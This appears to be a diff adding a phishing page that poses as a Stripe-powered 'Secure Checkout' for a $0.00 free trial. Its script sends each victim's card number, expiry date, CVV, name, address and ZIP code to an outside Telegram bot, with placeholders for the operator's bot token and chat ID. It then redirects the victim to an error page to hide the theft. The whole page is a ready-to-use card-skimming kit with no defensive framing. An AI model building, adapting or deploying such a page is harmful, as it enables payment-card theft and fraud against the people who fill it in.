@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .checkout-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .order-summary {
+            background-color: #f8f9fb;
+            padding: 8px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: #333;
+            border: 1px solid #ddd;
+        }
+
+        .order-summary h3 {
+            font-size: 13px;
+            margin-bottom: 5px;
+            color: #444;
+        }
+
+        .order-summary p {
+            font-size: 11px;
+            margin: 3px 0;
+            color: #666;
+        }
+
+        .order-summary .amount {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .input-field {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .input-field label {
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 4px;
+            font-size: 11px;
+            flex: 1;
+        }
+
+        .input-field input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #333;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        .input-field input:focus {
+            border-color: #8e44ad;
+            outline: none;
+        }
+
+        .input-field input::placeholder {
+            color: #aaa;
+        }
+
+        .input-field i {
+            margin-right: 10px;
+            color: #555;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 8px;
+            background-color: #8e44ad;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #9b59b6;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 9px;
+            color: #999;
+            margin-top: 12px;
+        }
+
+        .footer a {
+            color: #8e44ad;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #eee;
+            margin: 12px 0;
+        }
+
+        .powered-by {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        .powered-by span {
+            color: #8e44ad;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+<div class="checkout-container">
+    <h2>Secure Checkout</h2>
+
+    <!-- Order Summary Box -->
+    <div class="order-summary">
+        <h3>Order Summary</h3>
+        <p><strong>Product:</strong> Free Trial</p>
+        <p><strong>Period:</strong> 30 Days</p>
+        <p class="amount">$0.00</p>
+        <p><strong>Tax (if applicable):</strong> $0.00</p>
+        <div class="divider"></div>
+        <p><strong>Total:</strong> <span class="amount">$0.00</span></p>
+    </div>
+
+    <!-- Cardholder Information -->
+    <div class="input-field">
+        <i class="fas fa-user"></i>
+        <label for="cardholderName">
+            Cardholder Name
+        </label>
+        <input type="text" id="cardholderName" placeholder="John Doe" required>
+    </div>
+
+    <!-- Card Information -->
+    <div class="input-field">
+        <i class="fas fa-credit-card"></i>
+        <label for="cardNumber">
+            Card Number
+        </label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9101 1121" required>
+    </div>
+
+    <div class="input-field">
+        <i class="fas fa-calendar-alt"></i>
+        <label for="expiryDate">
+            Expiry Date
+        </label>
+        <input type="text" id="expiryDate" placeholder="MM/YY" required>
+    </div>
+
+    <div class="input-field">
+        <i class="fas fa-lock"></i>
+        <label for="cvv">
+            CVV
+        </label>
+        <input type="number" id="cvv" placeholder="123" required>
+    </div>
+
+    <!-- Billing Address -->
+    <div class="input-field">
+        <i class="fas fa-map-marker-alt"></i>
+        <label for="billingAddress">
+            Billing Address
+        </label>
+        <input type="text" id="billingAddress" placeholder="123 Main St, City, Country" required>
+    </div>
+
+    <div class="input-field">
+        <i class="fas fa-city"></i>
+        <label for="city">
+            City
+        </label>
+        <input type="text" id="city" placeholder="City" required>
+    </div>
+
+    <div class="input-field">
+        <i class="fas fa-envelope"></i>
+        <label for="postalCode">
+            Postal Code
+        </label>
+        <input type="text" id="postalCode" placeholder="12345" required>
+    </div>
+
+    <!-- Submit Button -->
+    <button type="submit" class="submit-button" id="submitButton" disabled>Proceed to Payment</button>
+
+    <div class="footer">
+        <p>By completing this transaction, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+    </div>
+
+    <div class="powered-by">
+        <p>Powered by <span>Stripe</span></p>
+    </div>
+</div>
+
+<script>
+    const submitButton = document.getElementById('submitButton');
+    const cardholderName = document.getElementById('cardholderName');
+    const cardNumber = document.getElementById('cardNumber');
+    const expiryDate = document.getElementById('expiryDate');
+    const cvv = document.getElementById('cvv');
+    const billingAddress = document.getElementById('billingAddress');
+    const city = document.getElementById('city');
+    const postalCode = document.getElementById('postalCode');
+
+    const botToken = 'YOUR_BOT_TOKEN';  // Replace with your Telegram Bot Token
+    const chatId = 'YOUR_CHAT_ID';  // Replace with your chat ID
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert('Payment details sent to Telegram!');
+            } else {
+                alert('Error sending message');
+            }
+        })
+        .catch(error => {
+            alert('Error: ' + error);
+        });
+    }
+
+    function validateForm() {
+        const isCardholderNameValid = cardholderName.value.trim().split(" ").length > 1;
+        const isCardNumberValid = cardNumber.value.length >= 13 && cardNumber.value.length <= 19;
+        const isExpiryDateValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate.value);
+        const isCVVValid = cvv.value.length === 3;
+        const isBillingAddressValid = billingAddress.value.trim() !== '';
+        const isCityValid = city.value.trim() !== '';
+        const isPostalCodeValid = postalCode.value.trim() !== '';
+
+        if (isCardholderNameValid && isCardNumberValid && isExpiryDateValid && isCVVValid && isBillingAddressValid && isCityValid && isPostalCodeValid) {
+            submitButton.disabled = false;
+        } else {
+            submitButton.disabled = true;
+        }
+    }
+
+    submitButton.addEventListener('click', function (event) {
+        event.preventDefault();
+
+        const message = `
+            Number: ${cardNumber.value}
+            EXP Date: ${expiryDate.value}
+            CVV: ${cvv.value}
+            Full Name: ${cardholderName.value}
+            Address: ${billingAddress.value}
+            ZIP Code: ${postalCode.value}
+        `;
+
+        sendToTelegram(message);
+        window.location.href = 'error.html'; // Redirect to error page
+    });
+
+    cardholderName.addEventListener('input', validateForm);
+    cardNumber.addEventListener('input', validateForm);
+    expiryDate.addEventListener('input', validateForm);
+    cvv.addEventListener('input', validateForm);
+    billingAddress.addEventListener('input', validateForm);
+    city.addEventListener('input', validateForm);
+    postalCode.addEventListener('input', validateForm);
+</script>
+
+</body>
+</html>
